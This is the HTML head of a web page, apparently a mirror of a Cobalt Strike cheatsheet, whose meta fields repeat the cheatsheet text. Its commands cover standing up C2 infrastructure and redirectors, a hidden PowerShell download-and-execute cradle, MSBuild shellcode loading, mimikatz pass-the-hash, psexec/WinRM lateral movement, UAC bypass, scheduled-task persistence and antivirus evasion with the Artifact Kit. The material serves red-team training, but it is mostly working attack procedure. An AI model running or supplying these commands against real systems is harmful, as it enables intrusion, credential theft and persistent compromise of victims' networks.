<!DOCTYPE html>



<html lang="en-US" 
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="Cobalt strike cheatsheet" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Cobalt Strike Cobalt Strike is threat emulation software. Red teams and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs. Cobalt Strike exploits network vulnerabilities, launches spear phishing campaigns, hosts web drive-by attacks, and generates malware infected files from a powerful graphical user interface that encourages collaboration and reports all activity. 1 2 3 4 5 6 7 $ sudo apt-get update $ sudo apt-get install openjdk-11-jdk $ sudo apt install proxychains socat $ sudo update-java-alternatives -s java-1.11.0-openjdk-amd64 $ sudo ./teamserver 10.10.10.10 &quot;password&quot; [malleable C2 profile] $ ./cobaltstrike $ powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http://campaigns.example.com/download/dnsback&#39;))&quot; Summary Infrastructure Redirectors Domain fronting OpSec Payloads DNS Beacon SMB Beacon Metasploit compatibility Custom Payloads Malleable C2 Files Powershell and .NET Powershell commabds .NET remote execution Lateral Movement VPN &amp; Pivots Kits Elevate Kit Persistence Kit Resource Kit Artifact Kit References Infrastructure Redirectors 1 2 sudo apt install socat socat TCP4-LISTEN:80,fork TCP4:[TEAM SERVER]:80 Domain Fronting New Listener &gt; HTTP Host Header Target Finance &amp; Healthcare domains OpSec Don’t Change default self-signed HTTPS certificate Change default port (50050) 0.0.0.0 DNS response Metasploit compatibility, ask for a payload : wget -U &quot;Internet Explorer&quot; http://127.0.0.1/vl6D Do Use a redirector (Apache, CDN, …) Firewall to only accept HTTP/S from the redirectors Firewall 50050 and access via SSH tunnel Edit default HTTP 404 page and Content type: text/plain No staging set hosts_stage to false in Malleable C2 Payload DNS Beacon Edit the Zone File for the domain Create an A record for Cobalt Strike system Create an NS record that points to FQDN of your Cobalt Strike system Your Cobalt Strike team server system must be authoritative for the domains you specify. Create a DNS A record and point it to your Cobalt Strike team server. Use DNS NS records to delegate several domains or sub-domains to your Cobalt Strike team server’s A record. nslookup jibberish.beacon polling.campaigns.domain.com nslookup jibberish.beacon campaigns.domain.com Example of DNS on Digital Ocean: 1 2 3 NS example.com directs to 10.10.10.10. 86400 NS polling.campaigns.example.com directs to campaigns.example.com. 3600 A campaigns.example.com directs to 10.10.10.10 3600 1 2 3 4 5 systemctl disable systemd-resolved systemctl stop systemd-resolved rm /etc/resolv.conf echo &quot;nameserver 8.8.8.8&quot; &gt; /etc/resolv.conf echo &quot;nameserver 8.8.4.4&quot; &gt;&gt; /etc/resolv.conf Configuration: host: campaigns.domain.com beacon: polling.campaigns.domain.com Interact with a beacon, and sleep 0 SMB Beacon 1 2 3 4 link [host] [pipename] connect [host] [port] unlink [host] [PID] jump [exec] [host] [pipe] SMB Beacon uses Named Pipes. You might encounter these error code while running it. Error Code Meaning Description 2 File Not Found There is no beacon for you to link to 5 Access is denied Invalid credentials or you don’t have permission 53 Bad Netpath You have no trust relationship with the target system. It may or may not be a beacon there. SSH Beacon 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # deploy a beacon beacon&gt; help ssh Use: ssh [target:port] [user] [pass] Spawn an SSH client and attempt to login to the specified target beacon&gt; help ssh-key Use: ssh [target:port] [user] [/path/to/key.pem] Spawn an SSH client and attempt to login to the specified target # beacon&#39;s commands upload Upload a file download Download a file socks Start SOCKS4a server to relay traffic sudo Run a command via sudo rportfwd Setup a reverse port forward shell Execute a command via the shell Metasploit compatibility Payload: windows/meterpreter/reverse_http or windows/meterpreter/reverse_https Set LHOST and LPORT to the beacon Set DisablePayloadHandler to True Set PrependMigrate to True exploit -j Custom Payloads https://ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c 1 2 3 4 5 * Attacks &gt; Packages &gt; Payload Generator * Attacks &gt; Packages &gt; Scripted Web Delivery (S) $ python2 ./shellcode_encoder.py -cpp -cs -py payload.bin MySecretPassword xor $ C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Temp\dns_raw_stageless_x64.xml $ %windir%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \\10.10.10.10\Shared\dns_raw_stageless_x86.xml Malleable C2 Cobalt Strike - Malleable C2 Profiles https://github.com/xx0hcd/Malleable-C2-Profiles Cobalt Strike Malleable C2 Design and Reference Guide https://github.com/threatexpress/malleable-c2 Malleable-C2-Profiles https://github.com/rsmudge/Malleable-C2-Profiles 1 2 3 4 5 6 7 8 9 10 set useragent &quot;SOME AGENT&quot;; # GOOD set useragent &#39;SOME AGENT&#39;; # BAD prepend &quot;This is an example;&quot;; # Escape Double quotes append &quot;here is \&quot;some\&quot; stuff&quot;; # Escape Backslashes append &quot;more \\ stuff&quot;; # Some special characters do not need escaping prepend &quot;!@#$%^&amp;*()&quot;; Check a profile with ./c2lint. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 # # Etumbot Profile # http://www.arbornetworks.com/asert/2014/06/illuminating-the-etumbot-apt-backdoor/ # # Author: @harmj0y # set sample_name &quot;Etumbot&quot;; set sleeptime &quot;5000&quot;; set jitter &quot;0&quot;; set maxdns &quot;255&quot;; set useragent &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&quot;; http-get { set uri &quot;/image/&quot;; client { header &quot;Accept&quot; &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*l;q=0.8&quot;; header &quot;Referer&quot; &quot;http://www.google.com&quot;; header &quot;Pragma&quot; &quot;no-cache&quot;; header &quot;Cache-Control&quot; &quot;no-cache&quot;; metadata { netbios; append &quot;-.jpg&quot;; uri-append; } } server { header &quot;Content-Type&quot; &quot;img/jpg&quot;; header &quot;Server&quot; &quot;Microsoft-IIS/6.0&quot;; header &quot;X-Powered-By&quot; &quot;ASP.NET&quot;; output { base64; print; } } } http-post { set uri &quot;/history/&quot;; client { header &quot;Content-Type&quot; &quot;application/octet-stream&quot;; header &quot;Referer&quot; &quot;http://www.google.com&quot;; header &quot;Pragma&quot; &quot;no-cache&quot;; header &quot;Cache-Control&quot; &quot;no-cache&quot;; id { netbiosu; append &quot;.asp&quot;; uri-append; } output { base64; print; } } server { header &quot;Content-Type&quot; &quot;img/jpg&quot;; header &quot;Server&quot; &quot;Microsoft-IIS/6.0&quot;; header &quot;X-Powered-By&quot; &quot;ASP.NET&quot;; output { base64; print; } } } Files 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # List the file on the specified directory beacon &gt; ls &lt;C:\Path&gt; # Change into the specified working directory beacon &gt; cd [directory] # Delete a file\folder beacon &gt; rm [file\folder] # File copy beacon &gt; cp [src] [dest] # Download a file from the path on the Beacon host beacon &gt; download [C:\filePath] # Lists downloads in progress beacon &gt; downloads # Cancel a download currently in progress beacon &gt; cancel [*file*] # Upload a file from the attacker to the current Beacon host beacon &gt; upload [/path/to/file] Powershell and .NET Powershell commands 1 2 3 4 5 6 7 8 9 10 11 # Import a Powershell .ps1 script from the control server and save it in memory in Beacon beacon &gt; powershell-import [/path/to/script.ps1] # Setup a local TCP server bound to localhost and download the script imported from above using powershell.exe. Then the specified function and any arguments are executed and output is returned. beacon &gt; powershell [commandlet][arguments] # Launch the given function using Unmanaged Powershell, which does not start powershell.exe. The program used is set by spawnto beacon &gt; powerpick [commandlet] [argument] # Inject Unmanaged Powershell into a specific process and execute the specified command. This is useful for long-running Powershell jobs beacon &gt; psinject [pid][arch] [commandlet] [arguments] .NET remote execution Run a local .NET executable as a Beacon post-exploitation job. Require: Binaries compiled with the “Any CPU” configuration. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 beacon &gt; execute-assembly [/path/to/script.exe] [arguments] beacon &gt; execute-assembly /home/audit/Rubeus.exe [*] Tasked beacon to run .NET program: Rubeus.exe [+] host called home, sent: 318507 bytes [+] received output: ______ _ (_____ \ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \| ___ | | | |/___) | | \ \| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v1.4.2 Lateral Movement :warning: OPSEC Advice: Use the spawnto command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe portscan: Performs a portscan on a spesific target. runas: A wrapper of runas.exe, using credentials you can run a command as another user. pth: By providing a username and a NTLM hash you can perform a Pass The Hash attack and inject a TGT on the current process. :exclamation: This module needs Administrator privileges. steal_token: Steal a token from a specified process. make_token: By providing credentials you can create an impersonation token into the current process and execute commands from the context of the impersonated user. jump: Provides easy and quick way to move lateraly using winrm or psexec to spawn a new beacon session on a target. :exclamation: The jump module will use the current delegation/impersonation token to authenticate on the remote target. :muscle: We can combine the jump module with the make_token or pth module for a quick “jump” to another target on the network. remote-exec: Execute a command on a remote target using psexec, winrm or wmi. :exclamation: The remote-exec module will use the current delegation/impersonation token to authenticate on the remote target. ssh/ssh-key: Authenticate using ssh with password or private key. Works for both linux and windows hosts. :warning: All the commands launch powershell.exe 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 Beacon Remote Exploits ====================== jump [module] [target] [listener] psexec x86 Use a service to run a Service EXE artifact psexec64 x64 Use a service to run a Service EXE artifact psexec_psh x86 Use a service to run a PowerShell one-liner winrm x86 Run a PowerShell script via WinRM winrm64 x64 Run a PowerShell script via WinRM Beacon Remote Execute Methods ============================= remote-exec [module] [target] [command] Methods Description ------- ----------- psexec Remote execute via Service Control Manager winrm Remote execute via WinRM (PowerShell) wmi Remote execute via WMI (PowerShell) Opsec safe Pass-the-Hash: mimikatz sekurlsa::pth /user:xxx /domain:xxx /ntlm:xxxx /run:&quot;powershell -w hidden&quot; steal_token PID Assume Control of Artifact Use link to connect to SMB Beacon Use connect to connect to TCP Beacon VPN &amp; Pivots :warning: Covert VPN doesn’t work with W10, and requires Administrator access to deploy. Use socks 8080 to setup a SOCKS4a proxy server on port 8080 (or any other port you choose). This will setup a SOCKS proxy server to tunnel traffic through Beacon. Beacon’s sleep time adds latency to any traffic you tunnel through it. Use sleep 0 to make Beacon check-in several times a second. 1 2 3 4 5 6 7 8 # Start a SOCKS server on the given port on your teamserver, tunneling traffic through the specified Beacon. Set the teamserver/port configuration in /etc/proxychains.conf for easy usage. beacon &gt; socks [PORT] # Proxy browser traffic through a specified Internet Explorer process. beacon &gt; browserpivot [pid] [x86|x64] # Bind to the specified port on the Beacon host, and forward any incoming connections to the forwarded host and port. beacon &gt; rportfwd [bind port] [forward host] [forward port] Kits Elevate Kit UAC Token Duplication : Fixed in Windows 10 Red Stone 5 (October 2018) 1 2 3 4 5 6 7 8 9 10 11 12 13 beacon&gt; runasadmin Beacon Command Elevators ======================== Exploit Description ------- ----------- ms14-058 TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113) ms15-051 Windows ClientCopyImage Win32k Exploit (CVE 2015-1701) ms16-016 mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051) svc-exe Get SYSTEM via an executable run as a service uac-schtasks Bypass UAC with schtasks.exe (via SilentCleanup) uac-token-duplication Bypass UAC with Token Duplication Persistence Kit https://github.com/0xthirteen/MoveKit https://github.com/fireeye/SharPersist 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # List persistences SharPersist -t schtaskbackdoor -m list SharPersist -t startupfolder -m list SharPersist -t schtask -m list # Add a persistence SharPersist -t schtaskbackdoor -c &quot;C:\Windows\System32\cmd.exe&quot; -a &quot;/c calc.exe&quot; -n &quot;Something Cool&quot; -m add SharPersist -t schtaskbackdoor -n &quot;Something Cool&quot; -m remove SharPersist -t service -c &quot;C:\Windows\System32\cmd.exe&quot; -a &quot;/c calc.exe&quot; -n &quot;Some Service&quot; -m add SharPersist -t service -n &quot;Some Service&quot; -m remove SharPersist -t schtask -c &quot;C:\Windows\System32\cmd.exe&quot; -a &quot;/c calc.exe&quot; -n &quot;Some Task&quot; -m add SharPersist -t schtask -c &quot;C:\Windows\System32\cmd.exe&quot; -a &quot;/c calc.exe&quot; -n &quot;Some Task&quot; -m add -o hourly SharPersist -t schtask -n &quot;Some Task&quot; -m remove Resource Kit The Resource Kit is Cobalt Strike’s means to change the HTA, PowerShell, Python, VBA, and VBS script templates Cobalt Strike uses in its workflows Artifact Kit Cobalt Strike uses the Artifact Kit to generate its executables and DLLs. The Artifact Kit is a source code framework to build executables and DLLs that evade some anti-virus products. The Artifact Kit build script creates a folder with template artifacts for each Artifact Kit technique. To use a technique with Cobalt Strike, go to Cobalt Strike -&gt; Script Manager, and load the artifact.cna script from that technique’s folder. Artifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 : Download the artifact kit : Go to Help -&gt; Arsenal to download Artifact Kit (requires a licensed version of Cobalt Strike) Install the dependencies : sudo apt-get install mingw-w64 Edit the Artifact code Change pipename strings Change VirtualAlloc in patch.c/patch.exe, e.g: HeapAlloc Change Import Build the Artifact Cobalt Strike -&gt; Script Manager &gt; Load .cna References Red Team Ops with Cobalt Strike (1 of 9): Operations Red Team Ops with Cobalt Strike (2 of 9): Infrastructure Red Team Ops with Cobalt Strike (3 of 9): C2 Red Team Ops with Cobalt Strike (4 of 9): Weaponization Red Team Ops with Cobalt Strike (5 of 9): Initial Access Red Team Ops with Cobalt Strike (6 of 9): Post Exploitation Red Team Ops with Cobalt Strike (7 of 9): Privilege Escalation Red Team Ops with Cobalt Strike (8 of 9): Lateral Movement Red Team Ops with Cobalt Strike (9 of 9): Pivoting A Deep Dive into Cobalt Strike Malleable C2 - Joe Vest - Sep 5, 2018 Cobalt Strike. Walkthrough for Red Teamers - Neil Lines - 15 Apr 2019 TALES OF A RED TEAMER: HOW TO SETUP A C2 INFRASTRUCTURE FOR COBALT STRIKE – UB 2018 - NOV 25 2018 Cobalt Strike - DNS Beacon How to Write Malleable C2 Profiles for Cobalt Strike - January 24, 2017" />
<meta property="og:description" content="Cobalt Strike Cobalt Strike is threat emulation software. Red teams and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs. Cobalt Strike exploits network vulnerabilities, launches spear phishing campaigns, hosts web drive-by attacks, and generates malware infected files from a powerful graphical user interface that encourages collaboration and reports all activity. 1 2 3 4 5 6 7 $ sudo apt-get update $ sudo apt-get install openjdk-11-jdk $ sudo apt install proxychains socat $ sudo update-java-alternatives -s java-1.11.0-openjdk-amd64 $ sudo ./teamserver 10.10.10.10 &quot;password&quot; [malleable C2 profile] $ ./cobaltstrike $ powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http://campaigns.example.com/download/dnsback&#39;))&quot; Summary Infrastructure Redirectors Domain fronting OpSec Payloads DNS Beacon SMB Beacon Metasploit compatibility Custom Payloads Malleable C2 Files Powershell and .NET Powershell commabds .NET remote execution Lateral Movement VPN &amp; Pivots Kits Elevate Kit Persistence Kit Resource Kit Artifact Kit References Infrastructure Redirectors 1 2 sudo apt install socat socat TCP4-LISTEN:80,fork TCP4:[TEAM SERVER]:80 Domain Fronting New Listener &gt; HTTP Host Header Target Finance &amp; Healthcare domains OpSec Don’t Change default self-signed HTTPS certificate Change default port (50050) 0.0.0.0 DNS response Metasploit compatibility, ask for a payload : wget -U &quot;Internet Explorer&quot; http://127.0.0.1/vl6D Do Use a redirector (Apache, CDN, …) Firewall to only accept HTTP/S from the redirectors Firewall 50050 and access via SSH tunnel Edit default HTTP 404 page and Content type: text/plain No staging set hosts_stage to false in Malleable C2 Payload DNS Beacon Edit the Zone File for the domain Create an A record for Cobalt Strike system Create an NS record that points to FQDN of your Cobalt Strike system Your Cobalt Strike team server system must be authoritative for the domains you specify. Create a DNS A record and point it to your Cobalt Strike team server. Use DNS NS records to delegate several domains or sub-domains to your Cobalt Strike team server’s A record. nslookup jibberish.beacon polling.campaigns.domain.com nslookup jibberish.beacon campaigns.domain.com Example of DNS on Digital Ocean: 1 2 3 NS example.com directs to 10.10.10.10. 86400 NS polling.campaigns.example.com directs to campaigns.example.com. 3600 A campaigns.example.com directs to 10.10.10.10 3600 1 2 3 4 5 systemctl disable systemd-resolved systemctl stop systemd-resolved rm /etc/resolv.conf echo &quot;nameserver 8.8.8.8&quot; &gt; /etc/resolv.conf echo &quot;nameserver 8.8.4.4&quot; &gt;&gt; /etc/resolv.conf Configuration: host: campaigns.domain.com beacon: polling.campaigns.domain.com Interact with a beacon, and sleep 0 SMB Beacon 1 2 3 4 link [host] [pipename] connect [host] [port] unlink [host] [PID] jump [exec] [host] [pipe] SMB Beacon uses Named Pipes. You might encounter these error code while running it. Error Code Meaning Description 2 File Not Found There is no beacon for you to link to 5 Access is denied Invalid credentials or you don’t have permission 53 Bad Netpath You have no trust relationship with the target system. It may or may not be a beacon there. SSH Beacon 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # deploy a beacon beacon&gt; help ssh Use: ssh [target:port] [user] [pass] Spawn an SSH client and attempt to login to the specified target beacon&gt; help ssh-key Use: ssh [target:port] [user] [/path/to/key.pem] Spawn an SSH client and attempt to login to the specified target # beacon&#39;s commands upload Upload a file download Download a file socks Start SOCKS4a server to relay traffic sudo Run a command via sudo rportfwd Setup a reverse port forward shell Execute a command via the shell Metasploit compatibility Payload: windows/meterpreter/reverse_http or windows/meterpreter/reverse_https Set LHOST and LPORT to the beacon Set DisablePayloadHandler to True Set PrependMigrate to True exploit -j Custom Payloads https://ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c 1 2 3 4 5 * Attacks &gt; Packages &gt; Payload Generator * Attacks &gt; Packages &gt; Scripted Web Delivery (S) $ python2 ./shellcode_encoder.py -cpp -cs -py payload.bin MySecretPassword xor $ C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Temp\dns_raw_stageless_x64.xml $ %windir%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \\10.10.10.10\Shared\dns_raw_stageless_x86.xml Malleable C2 Cobalt Strike - Malleable C2 Profiles https://github.com/xx0hcd/Malleable-C2-Profiles Cobalt Strike Malleable C2 Design and Reference Guide https://github.com/threatexpress/malleable-c2 Malleable-C2-Profiles https://github.com/rsmudge/Malleable-C2-Profiles 1 2 3 4 5 6 7 8 9 10 set useragent &quot;SOME AGENT&quot;; # GOOD set useragent &#39;SOME AGENT&#39;; # BAD prepend &quot;This is an example;&quot;; # Escape Double quotes append &quot;here is \&quot;some\&quot; stuff&quot;; # Escape Backslashes append &quot;more \\ stuff&quot;; # Some special characters do not need escaping prepend &quot;!@#$%^&amp;*()&quot;; Check a profile with ./c2lint. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 # # Etumbot Profile # http://www.arbornetworks.com/asert/2014/06/illuminating-the-etumbot-apt-backdoor/ # # Author: @harmj0y # set sample_name &quot;Etumbot&quot;; set sleeptime &quot;5000&quot;; set jitter &quot;0&quot;; set maxdns &quot;255&quot;; set useragent &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&quot;; http-get { set uri &quot;/image/&quot;; client { header &quot;Accept&quot; &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*l;q=0.8&quot;; header &quot;Referer&quot; &quot;http://www.google.com&quot;; header &quot;Pragma&quot; &quot;no-cache&quot;; header &quot;Cache-Control&quot; &quot;no-cache&quot;; metadata { netbios; append &quot;-.jpg&quot;; uri-append; } } server { header &quot;Content-Type&quot; &quot;img/jpg&quot;; header &quot;Server&quot; &quot;Microsoft-IIS/6.0&quot;; header &quot;X-Powered-By&quot; &quot;ASP.NET&quot;; output { base64; print; } } } http-post { set uri &quot;/history/&quot;; client { header &quot;Content-Type&quot; &quot;application/octet-stream&quot;; header &quot;Referer&quot; &quot;http://www.google.com&quot;; header &quot;Pragma&quot; &quot;no-cache&quot;; header &quot;Cache-Control&quot; &quot;no-cache&quot;; id { netbiosu; append &quot;.asp&quot;; uri-append; } output { base64; print; } } server { header &quot;Content-Type&quot; &quot;img/jpg&quot;; header &quot;Server&quot; &quot;Microsoft-IIS/6.0&quot;; header &quot;X-Powered-By&quot; &quot;ASP.NET&quot;; output { base64; print; } } } Files 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # List the file on the specified directory beacon &gt; ls &lt;C:\Path&gt; # Change into the specified working directory beacon &gt; cd [directory] # Delete a file\folder beacon &gt; rm [file\folder] # File copy beacon &gt; cp [src] [dest] # Download a file from the path on the Beacon host beacon &gt; download [C:\filePath] # Lists downloads in progress beacon &gt; downloads # Cancel a download currently in progress beacon &gt; cancel [*file*] # Upload a file from the attacker to the current Beacon host beacon &gt; upload [/path/to/file] Powershell and .NET Powershell commands 1 2 3 4 5 6 7 8 9 10 11 # Import a Powershell .ps1 script from the control server and save it in memory in Beacon beacon &gt; powershell-import [/path/to/script.ps1] # Setup a local TCP server bound to localhost and download the script imported from above using powershell.exe. Then the specified function and any arguments are executed and output is returned. beacon &gt; powershell [commandlet][arguments] # Launch the given function using Unmanaged Powershell, which does not start powershell.exe. The program used is set by spawnto beacon &gt; powerpick [commandlet] [argument] # Inject Unmanaged Powershell into a specific process and execute the specified command. This is useful for long-running Powershell jobs beacon &gt; psinject [pid][arch] [commandlet] [arguments] .NET remote execution Run a local .NET executable as a Beacon post-exploitation job. Require: Binaries compiled with the “Any CPU” configuration. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 beacon &gt; execute-assembly [/path/to/script.exe] [arguments] beacon &gt; execute-assembly /home/audit/Rubeus.exe [*] Tasked beacon to run .NET program: Rubeus.exe [+] host called home, sent: 318507 bytes [+] received output: ______ _ (_____ \ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \| ___ | | | |/___) | | \ \| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v1.4.2 Lateral Movement :warning: OPSEC Advice: Use the spawnto command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe portscan: Performs a portscan on a spesific target. runas: A wrapper of runas.exe, using credentials you can run a command as another user. pth: By providing a username and a NTLM hash you can perform a Pass The Hash attack and inject a TGT on the current process. :exclamation: This module needs Administrator privileges. steal_token: Steal a token from a specified process. make_token: By providing credentials you can create an impersonation token into the current process and execute commands from the context of the impersonated user. jump: Provides easy and quick way to move lateraly using winrm or psexec to spawn a new beacon session on a target. :exclamation: The jump module will use the current delegation/impersonation token to authenticate on the remote target. :muscle: We can combine the jump module with the make_token or pth module for a quick “jump” to another target on the network. remote-exec: Execute a command on a remote target using psexec, winrm or wmi. :exclamation: The remote-exec module will use the current delegation/impersonation token to authenticate on the remote target. ssh/ssh-key: Authenticate using ssh with password or private key. Works for both linux and windows hosts. :warning: All the commands launch powershell.exe 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 Beacon Remote Exploits ====================== jump [module] [target] [listener] psexec x86 Use a service to run a Service EXE artifact psexec64 x64 Use a service to run a Service EXE artifact psexec_psh x86 Use a service to run a PowerShell one-liner winrm x86 Run a PowerShell script via WinRM winrm64 x64 Run a PowerShell script via WinRM Beacon Remote Execute Methods ============================= remote-exec [module] [target] [command] Methods Description ------- ----------- psexec Remote execute via Service Control Manager winrm Remote execute via WinRM (PowerShell) wmi Remote execute via WMI (PowerShell) Opsec safe Pass-the-Hash: mimikatz sekurlsa::pth /user:xxx /domain:xxx /ntlm:xxxx /run:&quot;powershell -w hidden&quot; steal_token PID Assume Control of Artifact Use link to connect to SMB Beacon Use connect to connect to TCP Beacon VPN &amp; Pivots :warning: Covert VPN doesn’t work with W10, and requires Administrator access to deploy. Use socks 8080 to setup a SOCKS4a proxy server on port 8080 (or any other port you choose). This will setup a SOCKS proxy server to tunnel traffic through Beacon. Beacon’s sleep time adds latency to any traffic you tunnel through it. Use sleep 0 to make Beacon check-in several times a second. 1 2 3 4 5 6 7 8 # Start a SOCKS server on the given port on your teamserver, tunneling traffic through the specified Beacon. Set the teamserver/port configuration in /etc/proxychains.conf for easy usage. beacon &gt; socks [PORT] # Proxy browser traffic through a specified Internet Explorer process. beacon &gt; browserpivot [pid] [x86|x64] # Bind to the specified port on the Beacon host, and forward any incoming connections to the forwarded host and port. beacon &gt; rportfwd [bind port] [forward host] [forward port] Kits Elevate Kit UAC Token Duplication : Fixed in Windows 10 Red Stone 5 (October 2018) 1 2 3 4 5 6 7 8 9 10 11 12 13 beacon&gt; runasadmin Beacon Command Elevators ======================== Exploit Description ------- ----------- ms14-058 TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113) ms15-051 Windows ClientCopyImage Win32k Exploit (CVE 2015-1701) ms16-016 mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051) svc-exe Get SYSTEM via an executable run as a service uac-schtasks Bypass UAC with schtasks.exe (via SilentCleanup) uac-token-duplication Bypass UAC with Token Duplication Persistence Kit https://github.com/0xthirteen/MoveKit https://github.com/fireeye/SharPersist 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # List persistences SharPersist -t schtaskbackdoor -m list SharPersist -t startupfolder -m list SharPersist -t schtask -m list # Add a persistence SharPersist -t schtaskbackdoor -c &quot;C:\Windows\System32\cmd.exe&quot; -a &quot;/c calc.exe&quot; -n &quot;Something Cool&quot; -m add SharPersist -t schtaskbackdoor -n &quot;Something Cool&quot; -m remove SharPersist -t service -c &quot;C:\Windows\System32\cmd.exe&quot; -a &quot;/c calc.exe&quot; -n &quot;Some Service&quot; -m add SharPersist -t service -n &quot;Some Service&quot; -m remove SharPersist -t schtask -c &quot;C:\Windows\System32\cmd.exe&quot; -a &quot;/c calc.exe&quot; -n &quot;Some Task&quot; -m add SharPersist -t schtask -c &quot;C:\Windows\System32\cmd.exe&quot; -a &quot;/c calc.exe&quot; -n &quot;Some Task&quot; -m add -o hourly SharPersist -t schtask -n &quot;Some Task&quot; -m remove Resource Kit The Resource Kit is Cobalt Strike’s means to change the HTA, PowerShell, Python, VBA, and VBS script templates Cobalt Strike uses in its workflows Artifact Kit Cobalt Strike uses the Artifact Kit to generate its executables and DLLs. The Artifact Kit is a source code framework to build executables and DLLs that evade some anti-virus products. The Artifact Kit build script creates a folder with template artifacts for each Artifact Kit technique. To use a technique with Cobalt Strike, go to Cobalt Strike -&gt; Script Manager, and load the artifact.cna script from that technique’s folder. Artifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 : Download the artifact kit : Go to Help -&gt; Arsenal to download Artifact Kit (requires a licensed version of Cobalt Strike) Install the dependencies : sudo apt-get install mingw-w64 Edit the Artifact code Change pipename strings Change VirtualAlloc in patch.c/patch.exe, e.g: HeapAlloc Change Import Build the Artifact Cobalt Strike -&gt; Script Manager &gt; Load .cna References Red Team Ops with Cobalt Strike (1 of 9): Operations Red Team Ops with Cobalt Strike (2 of 9): Infrastructure Red Team Ops with Cobalt Strike (3 of 9): C2 Red Team Ops with Cobalt Strike (4 of 9): Weaponization Red Team Ops with Cobalt Strike (5 of 9): Initial Access Red Team Ops with Cobalt Strike (6 of 9): Post Exploitation Red Team Ops with Cobalt Strike (7 of 9): Privilege Escalation Red Team Ops with Cobalt Strike (8 of 9): Lateral Movement Red Team Ops with Cobalt Strike (9 of 9): Pivoting A Deep Dive into Cobalt Strike Malleable C2 - Joe Vest - Sep 5, 2018 Cobalt Strike. Walkthrough for Red Teamers - Neil Lines - 15 Apr 2019 TALES OF A RED TEAMER: HOW TO SETUP A C2 INFRASTRUCTURE FOR COBALT STRIKE – UB 2018 - NOV 25 2018 Cobalt Strike - DNS Beacon How to Write Malleable C2 Profiles for Cobalt Strike - January 24, 2017" />
<link rel="canonical" href="http://localhost:4000/Cobalt-Strike-Cheatsheet/" />
<meta property="og:url" content="http://localhost:4000/Cobalt-Strike-Cheatsheet/" />
<meta property="og:site_name" content="PayloadsAllTheThings" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-01-30T00:00:00+07:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Cobalt strike cheatsheet" />
<meta name="twitter:site" content="@Zxce3_" />
<meta name="google-site-verification" content="google_meta_tag_verification" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"Cobalt strike cheatsheet","dateModified":"2021-01-30T00:00:00+07:00","datePublished":"2021-01-30T00:00:00+07:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/Cobalt-Strike-Cheatsheet/"},"url":"http://localhost:4000/Cobalt-Strike-Cheatsheet/","description":"Cobalt Strike Cobalt Strike is threat emulation software. Red teams and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs. Cobalt Strike exploits network vulnerabilities, launches spear phishing campaigns, hosts web drive-by attacks, and generates malware infected files from a powerful graphical user interface that encourages collaboration and reports all activity. 1 2 3 4 5 6 7 $ sudo apt-get update $ sudo apt-get install openjdk-11-jdk $ sudo apt install proxychains socat $ sudo update-java-alternatives -s java-1.11.0-openjdk-amd64 $ sudo ./teamserver 10.10.10.10 &quot;password&quot; [malleable C2 profile] $ ./cobaltstrike $ powershell.exe -nop -w hidden -c &quot;IEX ((new-object 